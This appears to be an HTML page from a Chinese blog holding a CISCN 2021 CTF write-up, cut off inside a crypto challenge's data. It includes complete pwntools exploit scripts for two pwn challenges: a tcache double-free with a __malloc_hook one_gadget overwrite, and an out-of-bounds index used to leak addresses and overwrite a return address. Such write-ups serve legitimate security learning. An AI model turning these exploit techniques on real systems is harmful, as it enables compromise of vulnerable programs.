@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"moe.lovmayoi.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":260,"display":"always","padding":10,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="感谢队友带我进分区赛 (">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ciscn2021初赛wp">
+<meta property="og:url" content="http://moe.lovmayoi.top/2021/05/20/ciscn2021-pre/index.html">
+<meta property="og:site_name" content="Shrimpwr&#39;s Blog">
+<meta property="og:description" content="感谢队友带我进分区赛 (">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-05-20T13:07:34.000Z">
+<meta property="article:modified_time" content="2021-05-20T13:22:42.503Z">
+<meta property="article:author" content="Shrimpwr">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://moe.lovmayoi.top/2021/05/20/ciscn2021-pre/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ciscn2021初赛wp | Shrimpwr's Blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-167856942-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-167856942-1');
+      }
+    </script>
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?117888d7b8203c259ff2167ff11fbc4b";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container use-motion">
+    <div class="headband"></div>
+   
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Shrimpwr's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Time to mix drinks.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">14</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://moe.lovmayoi.top/2021/05/20/ciscn2021-pre/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Shrimpwr">
+      <meta itemprop="description" content="无数渺小的思考填满了人的一生">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Shrimpwr's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ciscn2021初赛wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-20 21:07:34 / 修改时间：21:22:42" itemprop="dateCreated datePublished" datetime="2021-05-20T21:07:34+08:00">2021-05-20</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>14k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>12 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>感谢队友带我进分区赛 (</p>
+<a id="more"></a>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="lonely-wolf"><a href="#lonely-wolf" class="headerlink" title="lonely_wolf"></a>lonely_wolf</h3><p>先doublefree泄露堆地址，然后利用tcache_struct泄露libc地址，在mallochook伪造chunk写入onegadget地址并执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># context(log_level='debug')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/glibc/2.27/amd64/lib/libc-2.27.so")</span></span><br><span class="line">one_gadgets = [<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./lonely/lonelywolf"</span>)</span><br><span class="line"><span class="comment"># r = remote('124.71.236.63',26537)</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">"Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line">    <span class="keyword">return</span> r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x78</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b'a'</span>*<span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    s = show(<span class="number">0</span>)</span><br><span class="line">    heap_base = u64(s[<span class="number">10</span>:<span class="number">16</span>] + <span class="number">2</span>*<span class="string">b'\x00'</span>) - <span class="number">0x260</span></span><br><span class="line">    print(hex(heap_base))</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>, p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">'A'</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    s = show(<span class="number">0</span>)</span><br><span class="line">    malloc_hook_addr = u64(s[<span class="number">10</span>:<span class="number">16</span>] + <span class="number">2</span>*<span class="string">b'\x00'</span>) - <span class="number">0x70</span></span><br><span class="line">    print(hex(malloc_hook_addr))</span><br><span class="line">    libc_base = malloc_hook_addr - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    print(hex(libc_base))</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>,p64(malloc_hook_addr)*<span class="number">10</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    one_addr = libc_base + one_gadgets[<span class="number">2</span>]</span><br><span class="line">    edit(<span class="number">0</span>,p64(one_addr))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
+<h3 id="pwny"><a href="#pwny" class="headerlink" title="pwny"></a>pwny</h3><p>利用数组越界，覆写read函数中文件指针的参数，获取read功能，泄露libc地址和栈地址，覆写栈上返回地址为onegadget地址</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/glibc/2.27/amd64/lib/libc-2.27.so")</span></span><br><span class="line">r = remote(<span class="string">'124.71.236.63'</span>,<span class="number">26606</span>)</span><br><span class="line"><span class="comment"># r = process("./pwny/pwny")</span></span><br><span class="line">gadgets = [<span class="number">0x4f3d5</span>, <span class="number">0x4f432</span>, <span class="number">0x10a41c</span>] </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Your choice: "</span>, str(<span class="number">2</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_2</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Your choice: "</span>, str(<span class="number">2</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Your choice: "</span>, str(<span class="number">1</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">"Index: "</span>, p64(idx))</span><br><span class="line">    <span class="keyword">return</span> r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    write_(<span class="number">0</span>)</span><br><span class="line">    write_(<span class="number">256</span>)</span><br><span class="line">    write_(<span class="number">256</span>)</span><br><span class="line">    libc_stdout = int((read_(<span class="number">0x7ffffffffffffff8</span>)[<span class="number">8</span>:<span class="number">-1</span>]).decode(), <span class="number">16</span>)</span><br><span class="line">    print(hex(libc_stdout))</span><br><span class="line"></span><br><span class="line">    libc_base = libc_stdout - libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">    one_addr = libc_base + gadgets[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    p_addr = int((read_(<span class="number">0x7fffffffffffffa5</span>)[<span class="number">8</span>:<span class="number">-1</span>]).decode(), <span class="number">16</span>)</span><br><span class="line">    p_base = p_addr - <span class="number">0x9c0</span></span><br><span class="line">    array_addr = p_base + <span class="number">0x202060</span></span><br><span class="line"></span><br><span class="line">    env_addr = libc_base + libc.symbols[<span class="string">"environ"</span>]</span><br><span class="line">    <span class="comment"># print(hex(env_addr))</span></span><br><span class="line">    stack_addr = int((read_((env_addr - array_addr) // <span class="number">8</span>)[<span class="number">8</span>:<span class="number">-1</span>].decode()), <span class="number">16</span>)</span><br><span class="line">    ret_addr = stack_addr - <span class="number">0x120</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(hex(one_addr), hex(ret_addr))</span></span><br><span class="line">    write_2((ret_addr - array_addr)//<span class="number">8</span>, p64(one_addr))</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="imageencrypt"><a href="#imageencrypt" class="headerlink" title="imageencrypt"></a>imageencrypt</h3><p>先爆破出r, x (x=generate(x0)), key1, key2<br>( 这部分脚本写得十分抽象，自己写完都没想到真能跑出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">r = <span class="number">1.2</span></span><br><span class="line">testimage = [<span class="number">205</span>, <span class="number">237</span>, <span class="number">6</span>, <span class="number">158</span>, <span class="number">24</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">32</span>, <span class="number">74</span>, <span class="number">151</span>, <span class="number">142</span>, <span class="number">186</span>, <span class="number">57</span>, <span class="number">28</span>, <span class="number">113</span>, <span class="number">62</span>, <span class="number">165</span>, <span class="number">20</span>, <span class="number">190</span>, <span class="number">37</span>, <span class="number">159</span>, <span class="number">137</span>, <span class="number">196</span>, <span class="number">44</span>, <span class="number">97</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">222</span>, <span class="number">220</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">199</span>, <span class="number">142</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">119</span>, <span class="number">232</span>, <span class="number">250</span>, <span class="number">215</span>, <span class="number">60</span>, <span class="number">162</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">63</span>, <span class="number">30</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">217</span>, <span class="number">206</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">230</span>, <span class="number">42</span>, <span class="number">221</span>, <span class="number">71</span>, <span class="number">136</span>, <span class="number">115</span>, <span class="number">22</span>, <span class="number">176</span>, <span class="number">91</span>, <span class="number">57</span>, <span class="number">61</span>, <span class="number">3</span>, <span class="number">87</span>, <span class="number">73</span>, <span class="number">250</span>, <span class="number">121</span>, <span class="number">51</span>, <span class="number">72</span>, <span class="number">83</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">199</span>, <span class="number">236</span>, <span class="number">190</span>, <span class="number">249</span>, <span class="number">116</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">149</span>, <span class="number">94</span>, <span class="number">214</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">213</span>, <span class="number">119</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">203</span>, <span class="number">240</span>, <span class="number">114</span>, <span class="number">240</span>, <span class="number">29</span>, <span class="number">122</span>, <span class="number">188</span>, <span class="number">156</span>, <span class="number">53</span>, <span class="number">128</span>, <span class="number">185</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">245</span>, <span class="number">204</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">80</span>, <span class="number">229</span>, <span class="number">41</span>, <span class="number">150</span>, <span class="number">28</span>, <span class="number">195</span>, <span class="number">25</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">6</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">159</span>, <span class="number">172</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">254</span>, <span class="number">104</span>, <span class="number">236</span>, <span class="number">219</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">195</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">173</span>, <span class="number">163</span>, <span class="number">43</span>, <span class="number">167</span>, <span class="number">214</span>, <span class="number">50</span>, <span class="number">73</span>, <span class="number">115</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">138</span>, <span class="number">192</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">135</span>, <span class="number">90</span>, <span class="number">215</span>, <span class="number">106</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">143</span>, <span class="number">150</span>, <span class="number">185</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">176</span>, <span class="number">48</span>, <span class="number">138</span>, <span class="number">164</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">203</span>, <span class="number">210</span>, <span class="number">71</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">162</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">219</span>, <span class="number">195</span>, <span class="number">63</span>, <span class="number">248</span>, <span class="number">220</span>, <span class="number">155</span>, <span class="number">180</span>, <span class="number">219</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">94</span>, <span class="number">144</span>, <span class="number">247</span>, <span class="number">211</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">222</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">24</span>, <span class="number">13</span>, <span class="number">216</span>, <span class="number">185</span>, <span class="number">108</span>, <span class="number">137</span>, <span class="number">57</span>, <span class="number">186</span>, <span class="number">211</span>, <span class="number">55</span>, <span class="number">27</span>, <span class="number">158</span>, <span class="number">241</span>, <span class="number">223</span>, <span class="number">21</span>, <span class="number">134</span>, <span class="number">106</span>, <span class="number">152</span>, <span class="number">127</span>, <span class="number">187</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">131</span>, <span class="number">176</span>, <span class="number">177</span>, <span class="number">228</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">11</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">193</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">229</span>, <span class="number">145</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">3</span>, <span class="number">153</span>, <span class="number">123</span>, <span class="number">31</span>]</span><br><span class="line">test_enc = [<span class="number">131</span>, <span class="number">92</span>, <span class="number">72</span>, <span class="number">47</span>, <span class="number">177</span>, <span class="number">57</span>, <span class="number">131</span>, <span class="number">118</span>, <span class="number">4</span>, <span class="number">38</span>, <span class="number">192</span>, <span class="number">19</span>, <span class="number">119</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">143</span>, <span class="number">235</span>, <span class="number">165</span>, <span class="number">15</span>, <span class="number">140</span>, <span class="number">209</span>, <span class="number">223</span>, <span class="number">117</span>, <span class="number">133</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">81</span>, <span class="number">144</span>, <span class="number">138</span>, <span class="number">246</span>, <span class="number">173</span>, <span class="number">235</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">110</span>, <span class="number">39</span>, <span class="number">9</span>, <span class="number">192</span>, <span class="number">57</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">153</span>, <span class="number">141</span>, <span class="number">19</span>, <span class="number">234</span>, <span class="number">157</span>, <span class="number">142</span>, <span class="number">80</span>, <span class="number">234</span>, <span class="number">197</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">249</span>, <span class="number">143</span>, <span class="number">176</span>, <span class="number">155</span>, <span class="number">147</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">194</span>, <span class="number">191</span>, <span class="number">254</span>, <span class="number">13</span>, <span class="number">144</span>, <span class="number">140</span>, <span class="number">85</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">172</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">249</span>, <span class="number">5</span>, <span class="number">201</span>, <span class="number">27</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">23</span>, <span class="number">175</span>, <span class="number">34</span>, <span class="number">156</span>, <span class="number">72</span>, <span class="number">208</span>, <span class="number">32</span>, <span class="number">195</span>, <span class="number">16</span>, <span class="number">127</span>, <span class="number">65</span>, <span class="number">207</span>, <span class="number">131</span>, <span class="number">57</span>, <span class="number">203</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">211</span>, <span class="number">21</span>, <span class="number">45</span>, <span class="number">132</span>, <span class="number">214</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">97</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">76</span>, <span class="number">152</span>, <span class="number">216</span>, <span class="number">74</span>, <span class="number">149</span>, <span class="number">79</span>, <span class="number">165</span>, <span class="number">198</span>, <span class="number">72</span>, <span class="number">150</span>, <span class="number">94</span>, <span class="number">7</span>, <span class="number">177</span>, <span class="number">46</span>, <span class="number">226</span>, <span class="number">252</span>, <span class="number">247</span>, <span class="number">79</span>, <span class="number">62</span>, <span 